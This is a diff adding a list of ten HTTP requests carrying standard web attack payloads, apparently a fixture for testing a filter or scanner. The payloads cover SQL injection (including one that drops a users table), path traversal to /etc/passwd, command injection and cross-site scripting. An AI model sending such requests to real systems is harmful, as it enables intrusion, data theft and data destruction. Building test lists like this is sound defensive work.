@@ -1,0 +1,10 @@
+GET /search?q=1'+union+select+null,null--
+GET /x?id=1'+or+'1'='1
+GET /download?file=../../../etc/passwd
+GET /q?x=<script>alert(1)</script>
+GET /cmd?x=;cat+/etc/passwd
+GET /p?x=%252e%252e%252fetc%252fpasswd
+POST /login {"user":"a","pass":"1' or 1=1--"}
+GET /x?q=javascript:alert(1)
+GET /x?q=<svg/onload=alert(1)>
+GET /x?q=1;drop+table+users--
